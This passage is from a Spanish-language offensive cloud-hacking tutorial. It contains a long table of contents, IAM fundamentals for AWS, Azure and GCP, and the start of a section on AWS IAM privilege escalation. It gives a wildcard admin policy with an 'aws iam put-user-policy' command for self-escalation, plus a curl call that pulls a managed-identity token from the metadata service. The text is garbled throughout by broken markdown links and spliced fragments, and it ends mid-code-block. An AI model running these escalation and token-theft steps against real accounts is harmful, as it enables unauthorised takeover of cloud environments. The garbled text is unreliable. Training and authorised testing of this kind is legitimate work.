# cloud Hacking --- Guia completa de Explotacion en Entornos Cloud

> **Autor:** Equipo de Investigacion > **Idioma:** Espanol (Argentina) --- Informal tecnico > **Nivel:** Intermedio a Avanzado > **Duracion estimada:** 2-3 semanas de estudio intensivo

---

## Indice

> ⏱️ **Tiempo estimado:** 25 horas (~5 sesiones) (2686 lineas)


- 1. Introduccion al [cloud Hacking](#1-introduccion-al-cloud-hacking) - [1.1 Que es el Cloud Hacking?](#11-que-es-el-cloud-hacking) - 1.2 Modelo de Responsabilid[ad compartida](#12-modelo-de-responsabilidad-compartida) - 1.3 Vec[tores de Ataque Comunes en la Nube](#13-vectores-de-ataque-comunes-en-la-nube) - [1.4 Panorama Actual de Amenazas Cloud](#14-panorama-actual-de-amenazas-cloud) - [1.5 Configuracion del Entorno de Laboratorio](#15-configuracion-del-entorno-de-laboratorio)
- [2. Fundamentos de IAM](#2-fundamentos-de-iam) - 2.1 [aws IAM: Usuarios, Grupos, Roles y Politicas](#21-aws-iam-usuarios-grupos-roles-y-politicas) - 2.2 [azure RBAC: Roles, Asignaciones y Ambito](#22-azure-rbac-roles-asignaciones-y-ambito) - 2.3 [gcp IAM: Miembros, Roles y Politicas Jerarquicas](#23-gcp-iam-miembros-roles-y-politicas-jerarquicas) - [2.4 Comparativa entre Proveedores](#24-comparativa-entre-proveedores)
- [3. IAM Misconfigurations: Puerta de Entrada al Cloud](#3-iam-misconfigurations-puerta-de-entrada-al-cloud) - 3.1 [privilege escalation en AWS IAM](#31-privilege-escalation-en-aws-iam) - [3.1.1 iam:CreateUserPolicy y iam:PutUserPolicy](#311-iamcreateuserpolicy-y-iamputuserpolicy) - [3.1.2 iam:CreateRolePolicy y iam:PutRolePolicy](#312-iamcreaterolepolicy-y-iamputrolepolicy) - [3.1.3 iam:PassRole](#313-iampassrole) - [3.1.4 iam:CreatePolicyVersion](#314-iamcreatepolicyversion) - 3.1.5 iam:[setDefaultPolicyVersion](#315-iamsetdefaultpolicyversion) - [3.1.6 iam:UpdateAssumeRolePolicy](#316-iamupdateassumerolepolicy) - [3.1.7 iam:CreateLoginProfile](#317-iamcreateloginprofile) - [3.1.8 iam:CreateAccessKey](#318-iamcreateaccesskey) - 3.1.9 Escalada via Lambda (iam:PassRole + lambda:CreateFu[nction)](#319-escalada-via-lambda-iampassrole--lambdacreatefunction) - 3.1.10 Escalada via E[c2 (iam:PassRole + ec2:RunInstances)](#3110-escalada-via-ec2-iampassrole--ec2runinstances) - [3.1.11 Escalada via CloudFormation](#3111-escalada-via-cloudformation) - [3.1.12 Escalada via Glue](#3112-escalada-via-glue) - 3.1.13 Escalada via DataP[ipeline](#3113-escalada-via-datapipelineline) - [3.1.14 Ejercicio Practico: Escalada IAM en AWS](#3114-ejercicio-practico-escalada-iam-en-aws) - [3.2 Azure RBAC Privilege Escalation](#32-azure-rbac-privilege-escalation) - 3.2.1 Abuso de Roles de Admi[nistrador](#321-abuso-de-roles-de-administrador) - [3.2.2 Escalada via Managed Identity](#322-escalada-via-managed-identity) - 3.2.3 Abuso de [azure](../raw/cl0ud-h4ck1ng.md#azure) Resou[rce Manager](#323-abuso-de-azure-resource-manager) - [3.2.4 Escalada via Automation Account](#324-escalada-via-automation-account) - [3.2.5 Escalada via Logic Apps](#325-escalada-via-logic-apps) - [3.2.6 Ejercicio Practico: Escalada RBAC en Azure](#326-ejercicio-practico-escalada-rbac-en-azure) - [3.3 GCP IAM Privilege Escalation](#33-gcp-iam-privilege-escalation) - [3.3.1 Abuso de Service Account Keys](#331-abuso-de-service-account-keys) - [3.3.2 Escalada via Cloud Functions](#332-escalada-via-cloud-functions) - [3.3.3 Escalada via Cloud KMS](#333-escalada-via-cloud-kms) - [3.3.4 Escalada via Cloud Run](#334-escalada-via-cloud-run) - [3.3.5 Escalada via Compute Engine](#335-escalada-via-compute-engine) - [3.3.6 Ejercicio Practico: Escalada IAM en GCP](#336-ejercicio-practico-escalada-iam-en-gcp) - [3.4 Trust Policies y Role Chaining](#34-trust-policies-y-role-chaining) - [3.4.1 Cross-Account Role Assumption](#341-cross-account-role-assumption) - [3.4.2 Role Chaining en AWS](#342-role-chaining-en-aws) - [3.4.3 Federacion de Identidades](#343-federacion-de-identidades) - 3.4.4 [saml y OIDC Abuse](#344-saml-y-oidc-abuse)
- 4. Sto[rage Bucket exploitation](#4-storage-bucket-exploitation) - 4.1 [aws](../raw/cl0ud-h4ck1ng.md#aws) [s3](../raw/cl0ud-h4ck1ng.md#s3): A[natomy de un Bucket](#41-aws-s3-anatomy-de-un-bucket) - [4.1.1 Public Bucket Discovery](#411-public-bucket-discovery) - [4.1.2 Data Exfiltration desde S3](#412-data-exfiltration-desde-s3) - [4.1.3 ACL Manipulation](#413-acl-manipulation) - [4.1.4 Bucket Policy Exploitation](#414-bucket-policy-exploitation) - [4.1.5 Object Versioning Attacks](#415-object-versioning-attacks) - [4.1.6 S3 Server Access Logging Evasion](#416-s3-server-access-logging-evasion) - 4.1.7 S3 Event N[otifications Abuse](#417-s3-event-notifications-abuse) - [4.1.8 S3 Transfer Acceleration Exploitation](#418-s3-transfer-acceleration-exploitation) - [4.1.9 Ejercicio Practico: S3 Bucket Exploitation](#419-ejercicio-practico-s3-bucket-exploitation) - [4.2 Azure Blob Storage](#42-azure-blob-storage) - 4.2.1 Blob [container Discovery](#421-blob-container-discovery) - [4.2.2 SAS Token Exploitation](#422-sas-token-exploitation) - [4.2.3 Storage Account Key Abuse](#423-storage-account-key-abuse) - [4.2.4 Ejercicio Practico: Azure Blob Exploitation](#424-ejercicio-practico-azure-blob-exploitation) - [4.3 GCP Cloud Storage](#43-gcp-cloud-storage) - [4.3.1 Bucket Discovery y Enumeracion](#431-bucket-discovery-y-enumeracion) - [4.3.2 Signed URL Exploitation](#432-signed-url-exploitation) - [4.3.3 IAM Policy Exploitation en Buckets](#433-iam-policy-exploitation-en-buckets) - [4.3.4 Ejercicio Practico: GCP Storage Exploitation](#434-ejercicio-practico-gcp-storage-exploitation)
- [5. IMDS: Instance Metadata Service](#5-imds-instance-metadata-service) - [5.1 IMDSv1: El Problema Original](#51-imdsv1-el-problema-original) - [5.2 IMDSv2: Defensa por Sesion](#52-imdsv2-defensa-por-sesion) - 5.3 [ssrf a Cloud Metadata](#53-ssrf-a-cloud-metadata) - [5.3.1 Server-Side Request Forgery basico](#531-server-side-request-forgery-basico) - [5.3.2 SSRF ciego a Metadata](#532-ssrf-ciego-a-metadata) - 5.3.3 [ssrf](../raw/w3b-h4ck1ng.md#ssrf) con [redirect](#533-ssrf-con-redirect) - [5.4 Token Theft de IMDSv2](#54-token-theft-de-imdsv2) - [5.4.1 Bypass de cabecera X-Forwarded-For](#541-bypass-de-cabecera-x-forwarded-for) - 5.4.2 Bypass con [dns Rebinding](#542-bypass-con-dns-rebinding) - [5.4.3 Extraccion de credenciales IMDSv2](#543-extraccion-de-credenciales-imdsv2) - [5.5 IMDS en Azure: Instance Metadata Service](#55-imds-en-azure-instance-metadata-service) - [5.6 IMDS en GCP: Metadata Server](#56-imds-en-gcp-metadata-server) - [5.7 Ejercicio Practico: SSRF a Metadata](#57-ejercicio-practico-ssrf-a-metadata)
- [6. AWS-Specific Attacks](#6-aws-specific-attacks) - [6.1 AssumeRole Attacks](#61-assumerole-attacks) - [6.1.1 Cross-Account Role Assumption Maliciosa](#611-cross-account-role-assumption-maliciosa) - [6.1.2 Role Trust Policy Manipulation](#612-role-trust-policy-manipulation) - [6.1.3 Chaining de Roles para Persistencia](#613-chaining-de-roles-para-persistencia) - [6.2 Lambda Privilege Escalation](#62-lambda-privilege-escalation) - [6.2.1 lambda:CreateFunction con iam:PassRole](#621-lambdacreatefunction-con-iampassrole) - [6.2.2 lambda:UpdateFunctionCode](#622-lambdaupdatefunctioncode) - [6.2.3 lambda:InvokeFunction + lambda:AddPermission](#623-lambdainvokefunction--lambdaaddpermission) - [6.2.4 Lambda Layer Exploitation](#624-lambda-layer-exploitation) - 6.2.5 Environment [variable Theft en Lambda](#625-environment-variable-theft-en-lambda) - [6.3 CloudFormation Template Injection](#63-cloudformation-template-injection) - [6.3.1 Template Parameters Abuse](#631-template-parameters-abuse) - [6.3.2 Nested Stack Exploitation](#632-nested-stack-exploitation) - [6.3.3 Custom Resource Lambda Backdoor](#633-custom-resource-lambda-backdoor) - [6.4 SSM Agent Abuse](#64-ssm-agent-abuse) - [6.4.1 SSM Command Execution](#641-ssm-command-execution) - [6.4.2 SSM Parameter Store Secrets Extraction](#642-ssm-parameter-store-secrets-extraction) - [6.4.3 SSM Agent Credential Theft](#643-ssm-agent-credential-theft) - [6.4.4 Session Manager Port Forwarding](#644-session-manager-port-forwarding) - [6.5 ECS/EKS/Fargate Exploitation](#65-ecseksfargate-exploitation) - [6.5.1 ECS Task Definition Abuse](#651-ecs-task-definition-abuse) - 6.5.2 EKS [pod Escalation](#652-eks-pod-escalation) - [6.5.3 Fargate Sidecar Injection](#653-fargate-sidecar-injection) - [6.6 API Gateway Abuse](#66-api-gateway-abuse) - [6.7 Cognito Misconfigurations](#67-cognito-misconfigurations) - [6.8 KMS Key Abuse](#68-kms-key-abuse)
- [7. Azure-Specific Attacks](#7-azure-specific-attacks) - [7.1 Managed Identity Abuse](#71-managed-identity-abuse) - [7.1.1 Token Extraction desde VM](#711-token-extraction-desde-vm) - [7.1.2 Token Relay](#712-token-relay) - [7.1.3 Cross-Resource Token Abuse](#713-cross-resource-token-abuse) - [7.2 Key Vault Extraction](#72-key-vault-extraction) - [7.2.1 Access Policy Abuse](#721-access-policy-abuse) - [7.2.2 RBAC vs Access Policies Bypass](#722-rbac-vs-access-policies-bypass) - 7.2.3 Key Vault [firewall Bypass](#723-key-vault-firewall-bypass) - [7.2.4 Soft-Delete Recovery Attack](#724-soft-delete-recovery-attack) - [7.3 Automation Account Exploitation](#73-automation-account-exploitation) - [7.3.1 Runbook Hijacking](#731-runbook-hijacking) - [7.3.2 Hybrid Worker Abuse](#732-hybrid-worker-abuse) - [7.3.3 Credential Extraction desde Runbooks](#733-credential-extraction-desde-runbooks) - [7.4 Logic App Abuse](#74-logic-app-abuse) - 7.4.1 [http Trigger Exploitation](#741-http-trigger-exploitation) - [7.4.2 Managed Identity en Logic Apps](#742-managed-identity-en-logic-apps) - [7.4.3 Logic App Backdoor Creation](#743-logic-app-backdoor-creation) - 7.5 [azure ad (entra id) Attacks](#75-azure-ad-entra-id-attacks) - [7.5.1 App Registration Abuse](#751-app-registration-abuse) - [7.5.2 Service Principal Hijacking](#752-service-principal-hijacking) - 7.5.3 [oauth Consent Phishing](#753-oauth-consent-phishing) - [7.5.4 Privilege Escalation via Application Permissions](#754-privilege-escalation-via-application-permissions) - [7.6 Azure Container Registry Abuse](#76-azure-container-registry-abuse) - 7.7 Azure [kubernetes-d33p Service Exploitation](#77-azure-kubernetes-service-exploitation) - [7.8 Function App Exploitation](#78-function-app-exploitation)
- [8. GCP-Specific Attacks](#8-gcp-specific-attacks) - [8.1 Service Account Key Theft](#81-service-account-key-theft) - [8.1.1 Extraccion desde Compute Engine](#811-extraccion-desde-compute-engine) - [8.1.2 Extraccion desde Cloud Functions](#812-extraccion-desde-cloud-functions) - [8.1.3 Key Rotation Bypass](#813-key-rotation-bypass) - [8.1.4 Impersonacion de Service Accounts](#814-impersonacion-de-service-accounts) - [8.2 Cloud Functions Exploitation](#82-cloud-functions-exploitation) - [8.2.1 Function URL Abuse](#821-function-url-abuse) - [8.2.2 Event-Triggered Function Poisoning](#822-event-triggered-function-poisoning) - [8.2.3 Environment Variable Extraction](#823-environment-variable-extraction) - [8.2.4 Background Function Persistence](#824-background-function-persistence) - [8.3 KMS Key Abuse](#83-kms-key-abuse) - [8.3.1 Key Ring Enumeration](#831-key-ring-enumeration) - [8.3.2 CryptoKey Exploitation](#832-cryptokey-exploitation) - [8.3.3 Key Import Tampering](#833-key-import-tampering) - [8.4 Cloud Storage IAM Exploitation](#84-cloud-storage-iam-exploitation) - [8.5 Cloud SQL Exploitation](#85-cloud-sql-exploitation) - [8.6 BigQuery Data Exfiltration](#86-bigquery-data-exfiltration) - 8.7 VPC and N[etwork Exploitation](#87-vpc-and-network-exploitation)
- [9. Herramientas de Cloud Hacking](#9-herramientas-de-cloud-hacking) - [9.1 Pacu --- AWS Exploitation Framework](#91-pacu---aws-exploitation-framework) - [9.1.1 Instalacion y Configuracion](#911-instalacion-y-configuracion) - [9.1.2 Modulos de Enumeracion](#912-modulos-de-enumeracion) - [9.1.3 Modulos de Explotacion](#913-modulos-de-explotacion) - [9.1.4 Modulos de Persistencia](#914-modulos-de-persistencia) - [9.1.5 Casos de Uso Avanzados](#915-casos-de-uso-avanzados) - [9.2 Enumerate-IAM](#92-enumerate-iam) - [9.2.1 Escaneo de Politicas IAM](#921-escaneo-de-politicas-iam) - [9.2.2 Identificacion de Paths de Escalada](#922-identificacion-de-paths-de-escalada) - [9.3 CloudFox](#93-cloudfox) - [9.3.1 Enumeracion Multi-Cloud](#931-enumeracion-multi-cloud) - [9.3.2 Busqueda de Secretos](#932-busqueda-de-secretos) - [9.3.3 Analisis de Rutas de Ataque](#933-analisis-de-rutas-de-ataque) - [9.4 ScoutSuite](#94-scoutsuite) - [9.4.1 Auditoria de Seguridad Multi-Cloud](#941-auditoria-de-seguridad-multi-cloud) - [9.4.2 Reportes y Findings](#942-reportes-y-findings) - [9.5 Prowler](#95-prowler) - [9.5.1 Auditoria CIS Benchmark](#951-auditoria-cis-benchmark) - [9.5.2 Escaneo Automatizado](#952-escaneo-automatizado) - 9.6 Clo[udsplaining](#96-cloudsplaining) - [9.7 SkyArk](#97-skyark) - [9.8 Otras Herramientas Utiles](#98-otras-herramientas-utiles)
- [10. Escenarios de Ataque Completos](#10-escenarios-de-ataque-completos) - [10.1 Escenario 1: Cloud a On-Prem Pivot](#101-escenario-1-cloud-a-on-prem-pivot) - 10.1.1 Fase de [reconocimiento](#1011-fase-de-reconocimiento) - [10.1.2 Explotacion Inicial de IAM](#1012-explotacion-inicial-de-iam) - [10.1.3 Movimiento Lateral en la Nube](#1013-movimiento-lateral-en-la-nube) - [10.1.4 Pivot a On-Premises](#1014-pivot-a-on-premises) - [10.2 Escenario 2: Cross-Account Attack](#102-escenario-2-cross-account-attack) - [10.2.1 Enumeracion de Cuentas](#1021-enumeracion-de-cuentas) - [10.2.2 Trust Policy Exploitation](#1022-trust-policy-exploitation) - [10.2.3 Role Chaining entre Cuentas](#1023-role-chaining-entre-cuentas) - [10.2.4 Exfiltracion Cross-Account](#1024-exfiltracion-cross-account) - [10.3 Escenario 3: Cloud Service Abuse](#103-escenario-3-cloud-service-abuse) - [10.3.1 Lambda Cryptomining](#1031-lambda-cryptomining) - [10.3.2 S3 Data Exfiltration Masiva](#1032-s3-data-exfiltration-masiva) - [10.3.3 Resource Hijacking para C2](#1033-resource-hijacking-para-c2) - [10.4 Escenario 4: Supply Chain Attack via Cloud](#104-escenario-4-supply-chain-attack-via-cloud) - [10.5 Escenario 5: Data Breach Multi-Cloud](#105-escenario-5-data-breach-multi-cloud)
- [11. Defensa y Mitigacion](#11-defensa-y-mitigacion) - [11.1 Principios de Minimo Privilegio](#111-principios-de-minimo-privilegio) - [11.2 Politicas de Confianza Zero](#112-politicas-de-confianza-zero) - [11.3 Monitoreo y Logging](#113-monitoreo-y-logging) - [11.4 Herramientas de Defensa Cloud](#114-herramientas-de-defensa-cloud) - [11.5 Incident Response en la Nube](#115-incident-response-en-la-nube)
- [12. Laboratorios y Ejercicios Finales](#12-laboratorios-y-ejercicios-finales) - [12.1 Laboratorio 1: CTF AWS](#121-laboratorio-1-ctf-aws) - [12.2 Laboratorio 2: CTF Azure](#122-laboratorio-2-ctf-azure) - [12.3 Laboratorio 3: CTF GCP](#123-laboratorio-3-ctf-gcp)
- [13. Apendices](#13-apendices) - [13.1 Cheatsheet de Comandos AWS CLI](#131-cheatsheet-de-comandos-aws-cli) - [13.2 Cheatsheet de Comandos Azure CLI](#132-cheatsheet-de-comandos-azure-cli) - [13.3 Cheatsheet de Comandos GCP CLI](#133-cheatsheet-de-comandos-gcp-cli) - [13.4 Referencia de Politicas IAM](#134-referencia-de-politicas-iam)

---

## 1. Introduccion al [cloud](../raw/cl0ud-h4ck1ng.md) Hacking

### 1.1 Que es el Cloud Hacking?

El cloud hacking es la practica de identificar y explotar vulnerabilidades en infraestructura cloud. No estamos hablando de "adivinar la contrasena de la consola [aws](../raw/cl0ud-h4ck1ng.md#aws)" --- esto va mucho mas profundo. Hablamos de cadenas de confianza que se rompen, politicas IAM mal escritas que te dejan escalar privilegios como si nada, buckets [s3](../raw/cl0ud-h4ck1ng.md#s3) con [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) de mundo, metadata services mal protegidos, y un largo etcetera.

La nube cambio completamente el paradigma de seguridad. Ya no tenes un perimetro [fisico](../raw/ph7s1c4l-r3d.md) con un [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls) y listo. Ahora tenes APIs, identidades, politicas, y un monton de servicios interconectados. Cada llamada a una API es una puerta potencial.

Pensalo asi: en la nube, TODO es una API. Queres listar instancias Ec2? API call. Queres leer de un bucket S3? API call. Queres crear un usuario IAM? API call. Si tenes las credenciales correctas, podes hacer cualquier cosa desde cualquier parte del mundo. Eso es hermoso para la productividad, pero es una pesadilla de seguridad si no se configura bien.

### 1.2 Modelo de Responsabilidad Compartida

Cada proveedor cloud maneja el modelo de responsabilidad compartida de manera similar, pero con matices:

AWS: Responsabilidad de AWS = Seguridad DE la nube Responsabilidad del cliente = Seguridad EN la nube

[azure](../raw/cl0ud-h4ck1ng.md#azure): Responsabilidad de Microsoft = Seguridad DE la nube Responsabilidad del cliente = Seguridad EN la nube

[gcp](../raw/cl0ud-h4ck1ng.md#gcp): Responsabilidad de Google = Seguridad DE la nube Responsabilidad del cliente = Seguridad EN la nube

**AWS Shared Responsibility Model:**

| Capa | Responsabilidad AWS | Responsabilidad Cliente |
|------|-------------------|------------------------|
| [physical security](../raw/ph7s1c4l-r3d.md) | SI | NO |
| Hypervisor | SI | NO |
| Network infrastructure | SI | NO |
| Operating system (EC2) | NO | SI |
| Application | NO | SI |
| IAM configuration | NO | SI |
| Data encryption | NO | SI |
| Network ACLs/SGs | NO | SI |

**Que significa esto para el atacante?**

Significa que el atacante no va a romper el hypervisor de AWS (probablemente). Pero va a explotar configuraciones mal hechas: politicas IAM demasiado permisivas, buckets publicos, keys filtradas, etc. El 99% de los breaches cloud son por responsabilidad del cliente, no del proveedor.

### 1.3 Vectores de Ataque Comunes en la Nube

1. **Credenciales expuestas** --- Access keys en GitHub, hardcodeadas en codigo, en archivos de configuracion, en environment variables.
2. **IAM mal configurado** --- Politicas demasiado permisivas, trust policies que permiten asumir roles desde afuera, falta de privilegio minimo.
3. **Buckets/Blobs/Storage publicos** --- Datos expuestos sin [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion).
4. **[ssrf](../raw/w3b-h4ck1ng.md#ssrf) + Metadata Service** --- Server-side request forgery que permite acceder al metadata service y robar credenciales.
5. **Servicios mal configurados** --- Security Groups abiertos, bases de datos publicas, puertos expuestos.
6. **Dependency confusion** --- Paquetes con nombres similares a dependencias internas que se suben a repos publicos.
7. **Supply chain attacks** --- Comprometer p[ipeline](./raw/c1cds [ci/cd](../raw/c1cd-h4ck1ng.md) para inyectar codigo malicioso.

### 1.4 Panorama Actual de Amenazas Cloud

Segun el [cloud security](../raw/cl0ud-h4ck1ng.md) Report 2024:
- El 80% de las organizaciones reportaron al menos un incidente de seguridad cloud en el ultimo ano.
- El 45% de los breaches involucraron almacenamiento mal configurado.
- El 30% fueron por credenciales comprometidas.
- El tiempo promedio para explotar una configuracion incorrecta es de 10 minutos.
- El tiempo promedio para detectar un breach cloud es de 216 dias (si, ley6 bien).

**Casos reales famosos:**
- **Capital One (2019):** SSRF + IMDS a credenciales de rol a acceso a 100M+ registros.
- **Accenture (2021):** Buckets S3 publicos expusieron datos internos.
- **Pegasus Airlines (2022):** Bucket S3 mal configurado filtro 6.5 TB de datos.
- **Toyota (2023):** Access key expuesta en GitHub por casi 5 anos.
- **Microsoft (2024):** Breach de correos internos por llave de firma comprometida.

### 1.5 Configuracion del Entorno de Laboratorio

Para seguir este tutorial necesitas:

**Requerimientos minimos:**
- [python](../raw/pyth0n-f0r-h4ck1ng.md) 3.10+
- Cuenta AWS Free Tier (o usar AWS Sandbox)
- Cuenta Azure Free
- Cuenta GCP Free Tier
- [docker](../raw/d0ck3r-f0r-h4ck3rs.md) Desktop o similar
- Visual Studio Code
- Git

**Instalacion de herramientas base:**

```bash
# AWS CLI
curl "https://awscli.amazonaws.com/AWSCLIV2.msi" -o "AWSCLIV2.msi"
msiexec /i AWSCLIV2.msi

# Azure CLI - PowerShell
Invoke-WebRequest -Uri "https://aka.ms/installazurecliwindows" -OutFile "AzureCLI.msi"
msiexec /i AzureCLI.msi

# GCP CLI
choco install gcloudsdk

# Verificar instalaciones
aws --version
az --version
gcloud --version
```

**Herramientas de hacking cloud:**

```bash
# Pacu - AWS exploitation framework
pip install pacu
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu
python install.py

# Enumerate-IAM
git clone https://github.com/andresriancho/enumerate-iam
cd enumerate-iam
pip install -r requirements.txt

# CloudFox
git clone https://github.com/BishopFox/cloudfox
cd cloudfox
go build .

# ScoutSuite
pip install scoutsuite

# Prowler
pip install prowler
git clone https://github.com/prowler-cloud/prowler
cd prowler
pip install -r requirements.txt

# Cloudsplaining
pip install cloudsplaining

# SkyArk
git clone https://github.com/cyberark/SkyArk
cd SkyArk
npm install
```

**Configuracion de perfiles:**

```bash
# AWS: Configurar credenciales
aws configure
# AWS Access Key ID: [tu_key]
# AWS Secret Access Key: [tu_secret]
# Default region: us-east-1

# Azure: Login
az login

# GCP: Login y configurar proyecto
gcloud auth login
gcloud config set project [tu-project-id]
gcloud auth application-default login
```

---

## 2. Fundamentos de IAM

### 2.1 [aws](../raw/cl0ud-h4ck1ng.md#aws) IAM: Usuarios, Grupos, Roles y Politicas

AWS IAM (Identity and Access Management) es el sistema de autenticacion y au[torizacion](./raw/s3c de AWS. Todo pasa por IAM.

**Usuarios (Users):**
Un usuario IAM representa una persona o aplicacion que necesita acceso a AWS. Tiene credenciales propias (access key + secret key) o puede usar la consola con usuario/contrasena.

```bash
# Crear un usuario IAM
aws iam create-user --user-name hacker-test

# Crear access key
aws iam create-access-key --user-name hacker-test

# Crear usuario con acceso a consola
aws iam create-login-profile --user-name hacker-test --password "Temporal123!" --no-password-reset-required
```

**Grupos (Groups):**
Los grupos son contenedores de usuarios. Se usan para asignar [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) a multiples usuarios a la vez.

```bash
# Crear grupo
aws iam create-group --group-name Admins

# Agregar usuario al grupo
aws iam add-user-to-group --user-name hacker-test --group-name Admins
```

**Roles (Roles):**
Un rol es una identidad que no tiene credenciales propias. Se asume temporalmente. Los roles son clave en la [escalada de privilegios](../raw/l1n9x-pr1v3sc.md).

```bash
# Crear un rol con trust policy
aws iam create-role --role-name TargetRole --assume-role-policy-document file://trust-policy.json
```

**Politicas (Policies):**
Las politicas definen que permisos tiene una identidad. Pueden ser managed (AWS predefinidas) o inline (creadas por el usuario).

```json
{ "Version": "2012-10-17", "Statement": [ { "Effect": "Allow", "Action": "s3:ListAllMyBuckets", "Resource": "*" } ]
}
```

**Tipos de politicas:**
- **AWS Managed:** Predefinidas por AWS (AdministratorAccess, ReadOnlyAccess, etc.)
- **Customer Managed:** Las creas vos y las reutilizas.
- **Inline:** Embebidas directamente en un user/group/role.
- **Resource-based:** Pegadas al recurso (como bucket policies o trust policies).

**Estructura de una politica IAM:**

```json
{ "Version": "2012-10-17", "Statement": [ { "Effect": "Allow|Deny", "Principal": { "AWS": "arn:aws:iam::123456789012:user/foo" }, "Action": ["service:Action1", "service:Action2"], "Resource": "arn:aws:service:region:account:resource", "Condition": { "IpAddress": { "aws:SourceIp": "192.168.0.0/16" } } } ]
}
```

**Elementos clave:**
- **Version:** Siempre "2012-10-17" (la mas reciente).
- **Statement:** Array de declaraciones.
- **Effect:** Allow o Deny (Deny siempre gana).
- **Principal:** Solo en resource-based policies. Indica quien recibe el permiso.
- **Action:** Lista de acciones permitidas o denegadas.
- **Resource:** ARN del recurso afectado.
- **Condition:** Condiciones adicionales que deben cumplirse.

**ARN (Amazon Resource Name):**
```
arn:partition:service:region:account:resource
arn:aws:s3:::my-bucket
arn:aws:iam::123456789012:role/MyRole
arn:aws:ec2:us-east-1:123456789012:instance/*
```

### 2.2 [azure](../raw/cl0ud-h4ck1ng.md#azure) RBAC: Roles, Asignaciones y Ambito

Azure usa Role-Based Access Control (RBAC) sobre Azure Resource Manager (ARM).

**Roles RBAC:**
Los roles son colecciones de permisos. Azure tiene roles predefinidos (Owner, Contributor, Reader, User Access Administrator) y roles personalizados.

```bash
# Listar roles
az role definition list --output table

# Ver detalle de un rol
az role definition list --name "Contributor" --output json
```

**Asignaciones (Role Assignments):**
Una asignacion RBAC vincula un rol con un principal (usuario, grupo, service principal, managed identity) en un ambito (subscription, resource group, resource).

```bash
# Asignar rol a usuario en un resource group
az role assignment create --assignee "user@domain.com" --role "Contributor" --resource-group "my-rg"
```

**Ambitos (Scopes):**
- Management Group
- Subscription
- Resource Group
- Resource

**azure [ad](../raw/hybr1d-1d3nt1ty.md) Roles vs RBAC:**
- [azure ad](../raw/hybr1d-1d3nt1ty.md) Roles: Controlan acceso al directorio (crear usuarios, resetear passwords, etc.)
- RBAC Roles: Controlan acceso a recursos de Azure (VMs, storage, etc.)

**Managed Identity:**
Una managed identity es como un service account automatico. Azure crea y maneja la identidad.

```bash
# Crear VM con managed identity
az vm create --resource-group my-rg --name my-vm --image UbuntuLTS --assign-identity --admin-username azureuser

# Obtener token de managed identity
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true"
```

### 2.3 [gcp](../raw/cl0ud-h4ck1ng.md#gcp) IAM: Miembros, Roles y Politicas Jerarquicas

GCP IAM usa un modelo jerarquico: Organization, Folders, Projects, Resources.

**Miembros:**
- Google Account (user@domain.[com](../raw/w1n-s9bsyst3ms.md#com))
- Service Account (sa@project.iam.gserviceaccount.com)
- Google Group
- Google Workspace Domain
- AllUsers / AllAuthenticatedUsers

**Roles:**
- **Primitive roles:** Owner, Editor, Viewer (a nivel proyecto) --- no recomendados.
- **Predefined roles:** Roles detallados especificos por servicio.
- **Custom roles:** Roles personalizados.

```bash
# Listar roles
gcloud iam roles list --project [PROJECT_ID]

# Ver rol
gcloud iam roles describe roles/storage.objectViewer
```

**Politicas IAM:**
```bash
# Obtener politica IAM de proyecto
gcloud projects get-iam-policy [PROJECT_ID] --format json
```

```json
{ "bindings": [ { "role": "roles/storage.admin", "members": [ "user:admin@domain.com", "serviceAccount:sa@project.iam.gserviceaccount.com" ] } ], "etag": "BwUqYMb1cE4="
}
```

**Service Accounts:**
Las service accounts son identidades para aplicaciones. Tienen claves (JSON) que se pueden descargar.

```bash
# Crear service account
gcloud iam service-accounts create my-sa --display-name "My Service Account"

# Crear y descargar clave
gcloud iam service-accounts keys create key.json --iam-account my-sa@[PROJECT_ID].iam.gserviceaccount.com

# Listar service accounts
gcloud iam service-accounts list
```

### 2.4 Comparativa entre Proveedores

| Concepto | AWS | Azure | GCP |
|----------|-----|-------|-----|
| Identidad | IAM User | Azure [ad](../raw/w1nd0ws-d0m41n-4dm1n.md) User/SP | Google Account/SA |
| Grupo | IAM Group | Azure AD Group | Google Group |
| Rol | IAM Role | RBAC Role | IAM Role |
| Politica | IAM Policy | RBAC Definition | IAM Policy |
| Unidad | Account | Subscription | Project |
| Servicio de identidad | IAM | [entra id](../raw/hybr1d-1d3nt1ty.md) + ARM | IAM + Resource Manager |
| Meta-instancia | 169.254.169.254 | 169.254.169.254 | 169.254.169.254 |
| Token por defecto | IMDS | Managed Identity | GCE Metadata |
| Privilegio minimo | Actions | Actions (data/control) | Permissions |

---

## 3. IAM Misconfigurations: Puerta de Entrada al [cloud](../raw/cl0ud-h4ck1ng.md)

### 3.1 [privilege escalation](../raw/l1n9x-pr1v3sc.md) en [aws](../raw/cl0ud-h4ck1ng.md#aws) IAM

Esta es la seccion mas importante de todo el tutorial. El privilege escalation en AWS IAM es el pan de cada dia para un cloud hacker. Cuando encuentres una cuenta AWS con ciertos [permisos](../raw/0s-f0nd4m3nt0s.md#permisos)](0s IAM, probablemente puedas escalar a administrador completo.

El research original de Rhino Security Labs documento 21+ paths de escalada. Vamos a ver los mas importantes.

#### 3.1.1 iam:CreateUserPolicy y iam:PutUserPolicy

Tenes permiso para crear o modificar politicas inline de usuarios, pero no tenes admin todavia.

**Como funciona?**
Si podes crear una politica inline para cualquier usuario (incluyendo el tuyo), simplemente creas una politica que te de permisos totales.

**Escenario:**
Tu usuario `hacker-user` tiene `iam:PutUserPolicy` (o `iam:CreateUserPolicy`).

**[exploit](../raw/m3t4spl01t.md#exploits):**

```json
{ "Version": "2012-10-17", "Statement": [ { "Effect": "Allow", "Action": "*", "Resource": "*" } ]
}
```

```bash
# Adjuntar politica inline a tu usuario
aws iam put-user-policy --user-name hacker-user --policy-name FullAdmin --policy-document file://admin-policy.json
```

Ahora `hacker-user` tiene permisos de administrador.

**Deteccion en Cloudsplaining:**
```bash
cloudsplaining scan --input-file input.json
```
Buscara `PrivilegeEscalation` paths en `iam:PutUserPolicy` y `iam:CreateUserPolicy`.

#### 3.1.2 iam:CreateRolePolicy y iam:PutRolePolicy

Similar al anterior, pero sobre roles. Tenes `iam:PutRolePolicy` o `iam:CreateRolePolicy`.

**Exploit:**

```bash
# Crear politica inline para un rol existente
